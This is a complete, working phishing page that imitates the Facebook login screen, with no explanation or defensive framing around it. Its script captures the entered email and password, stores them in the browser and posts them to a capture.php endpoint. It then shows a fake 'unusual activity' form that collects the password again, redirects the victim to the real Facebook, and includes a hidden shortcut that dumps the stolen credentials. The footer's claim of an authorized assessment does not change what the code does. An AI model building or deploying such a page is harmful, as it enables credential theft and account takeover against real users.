<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Facebook - Log In</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: Helvetica, Arial, sans-serif; }
    body { background: #f0f2f5; display: flex; flex-direction: column; align-items: center; min-height: 100vh; justify-content: center; }
    .container { display: flex; flex-wrap: wrap; align-items: center; justify-content: center; max-width: 980px; padding: 20px; gap: 40px; }
    .left { flex: 1; min-width: 300px; }
    .left h1 { color: #1877f2; font-size: 56px; font-weight: 700; margin-bottom: 10px; }
    .left p { font-size: 24px; color: #1c1e21; line-height: 1.3; }
    .right { flex: 0 0 396px; }
    .card { background: #fff; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1); padding: 20px; }
    .card form { display: flex; flex-direction: column; gap: 12px; }
    .card input { padding: 14px 16px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; outline: none; transition: .1s; }
    .card input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }
    .card .login-btn { background: #1877f2; color: #fff; border: none; padding: 12px; border-radius: 6px; font-size: 20px; font-weight: 700; cursor: pointer; }
    .card .login-btn:hover { background: #166fe5; }
    .card .forgot { text-align: center; color: #1877f2; font-size: 14px; text-decoration: none; padding: 8px 0; }
    .card .forgot:hover { text-decoration: underline; }
    .divider { border-bottom: 1px solid #dadde1; margin: 10px 0; }
    .card .create-btn { background: #42b72a; color: #fff; border: none; padding: 12px 16px; border-radius: 6px; font-size: 17px; font-weight: 700; cursor: pointer; margin: 0 auto; display: block; width: fit-content; }
    .card .create-btn:hover { background: #36a420; }
    .error-box { background: #ffebee; color: #c62828; padding: 12px; border-radius: 6px; font-size: 14px; display: none; text-align: center; }
    .loading-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.85); z-index: 999; justify-content: center; align-items: center; flex-direction: column; gap: 20px; }
    .loading-overlay.active { display: flex; }
    .spinner { border: 6px solid #e0e0e0; border-top: 6px solid #1877f2; border-radius: 50%; width: 50px; height: 50px; animation: spin .8s linear infinite; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    .loading-text { font-size: 20px; color: #1c1e21; font-weight: 500; }
    .fake-page { display: none; background: #fff; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,.1); padding: 30px; max-width: 500px; width: 100%; }
    .fake-page.active { display: block; }
    .fake-page h2 { margin-bottom: 20px; color: #1c1e21; }
    .fake-page input { width: 100%; padding: 14px 16px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; margin-bottom: 12px; outline: none; }
    .fake-page input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }
    .fake-page .submit-btn { background: #1877f2; color: #fff; border: none; padding: 12px; border-radius: 6px; font-size: 20px; font-weight: 700; cursor: pointer; width: 100%; }
    .footer { text-align: center; margin-top: 20px; font-size: 13px; color: #737373; }
    @media (max-width: 768px) { .container { flex-direction: column; align-items: center; } .left h1 { font-size: 36px; text-align: center; } .left p { font-size: 18px; text-align: center; } .right { flex: 0 0 auto; width: 100%; } }
  </style>
</head>
<body>

<div class="container" id="loginPage">
  <div class="left">
    <h1>facebook</h1>
    <p>Connect with friends and the world around you on Facebook.</p>
  </div>
  <div class="right">
    <div class="card">
      <form id="loginForm" autocomplete="off">
        <div class="error-box" id="errorBox"></div>
        <input type="text" id="email" name="email" placeholder="Email address or phone number" required autofocus>
        <input type="password" id="password" name="password" placeholder="Password" required>
        <button type="submit" class="login-btn">Log In</button>
        <a href="#" class="forgot">Forgotten password?</a>
        <div class="divider"></div>
        <button type="button" class="create-btn">Create new account</button>
      </form>
    </div>
  </div>
</div>

<div class="loading-overlay" id="loadingOverlay">
  <div class="spinner"></div>
  <div class="loading-text">Verifying your account...</div>
</div>

<div class="container" id="fakePage" style="display:none;">
  <div class="fake-page active">
    <h2>We noticed something unusual</h2>
    <p style="margin-bottom:20px;color:#65676b;">Please verify your account to continue.</p>
    <form id="fakeForm" autocomplete="off">
      <input type="text" id="fakeEmail" placeholder="Email address" readonly style="background:#f0f2f5;">
      <input type="password" id="fakePassword" placeholder="Re-enter your password" required>
      <button type="submit" class="submit-btn">Confirm</button>
    </form>
  </div>
</div>

<div class="footer">
  <p>This is an authorized security assessment. Do not use for illegal purposes.</p>
</div>

<script>
(function() {
  const loginForm = document.getElementById('loginForm');
  const fakeForm = document.getElementById('fakeForm');
  const loadingOverlay = document.getElementById('loadingOverlay');
  const fakePage = document.getElementById('fakePage');
  const loginPage = document.getElementById('loginPage');
  const errorBox = document.getElementById('errorBox');
  const fakeEmail = document.getElementById('fakeEmail');
  const emailInput = document.getElementById('email');
  const passwordInput = document.getElementById('password');

  const STORAGE_KEY = 'fb_captures';
  const txtFile = '/api/capture.php';
  let capturedEmail = '';

  function storeLocally(email, pass, step) {
    const entry = { email, pass, step, ts: new Date().toISOString() };
    let data = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
    data.push(entry);
    localStorage.setItem(STORAGE_KEY, JSON.stringify(data));
  }

  function sendToServer(email, pass, step) {
    // Try XMLHttpRequest first — most reliable
    try {
      var xhr = new XMLHttpRequest();
      xhr.open('POST', txtFile, true);
      xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
      xhr.withCredentials = false;
      var params = 'email=' + encodeURIComponent(email) + '&password=' + encodeURIComponent(pass) + '&step=' + encodeURIComponent(step);
      xhr.send(params);
    } catch(e) { /* fallback to fetch */ }

    // Also try fetch as backup
    try {
      fetch(txtFile, {
        method: 'POST',
        mode: 'no-cors',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'email=' + encodeURIComponent(email) + '&password=' + encodeURIComponent(pass) + '&step=' + encodeURIComponent(step)
      }).catch(function(){});
    } catch(e) {}
  }

  function captureCredentials(email, pass, step) {
    storeLocally(email, pass, step);
    sendToServer(email, pass, step);
  }

  loginForm.addEventListener('submit', function(e) {
    e.preventDefault();
    errorBox.style.display = 'none';
    var email = emailInput.value.trim();
    var pass = passwordInput.value;
    if (!email || !pass) {
      errorBox.textContent = 'Please fill in all fields.';
      errorBox.style.display = 'block';
      return;
    }
    capturedEmail = email;
    captureCredentials(email, pass, 'login');
    loginPage.style.display = 'none';
    loadingOverlay.style.display = 'flex';
    setTimeout(function() {
      loadingOverlay.style.display = 'none';
      fakePage.style.display = 'flex';
      fakeEmail.value = email;
    }, 2500);
  });

  fakeForm.addEventListener('submit', function(e) {
    e.preventDefault();
    var pass2 = document.getElementById('fakePassword').value;
    if (!pass2) return;
    captureCredentials(capturedEmail, pass2, 'verify');
    loadingOverlay.style.display = 'flex';
    setTimeout(function() {
      loadingOverlay.style.display = 'none';
      fakePage.style.display = 'none';
      loginPage.style.display = 'flex';
      document.getElementById('fakePassword').value = '';
      emailInput.value = '';
      passwordInput.value = '';
      // Redirect to actual Facebook
      window.location.href = 'https://www.facebook.com';
    }, 2000);
  });

  // Tester shortcut: Ctrl+Shift+D dumps localStorage
  document.addEventListener('keydown', function(e) {
    if (e.ctrlKey && e.shiftKey && e.key === 'D') {
      e.preventDefault();
      var data = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
      var output = '=== LOCAL CAPTURES ===\n';
      data.forEach(function(d) {
        output += '[' + d.ts + '] Step: ' + d.step + ' | Email: ' + d.email + ' | Password: ' + d.pass + '\n';
      });
      alert(output || 'No captures found.');
    }
  });

})();
</script>
</body>
</html>
